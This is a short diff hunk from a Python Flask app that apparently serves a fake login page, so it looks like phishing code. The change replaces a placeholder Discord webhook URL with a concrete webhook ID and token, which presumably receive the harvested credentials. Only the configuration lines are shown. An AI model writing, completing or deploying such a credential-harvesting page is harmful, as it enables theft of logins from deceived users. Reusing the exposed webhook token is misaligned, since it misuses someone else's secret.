@@ -5,7 +5,7 @@ import datetime
 app = Flask(__name__)
 
 # Discord webhook URL (replace with your own)
-WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1392456084429738024/CFTns1JQE6e8GJ-vS4rA2d4i2fYEdc1GXivTyGi0YNG2QX7uCvxRek5l-UL5uY2IBBLu"
 
 # HTML template for the fake login page
 LOGIN_PAGE = """
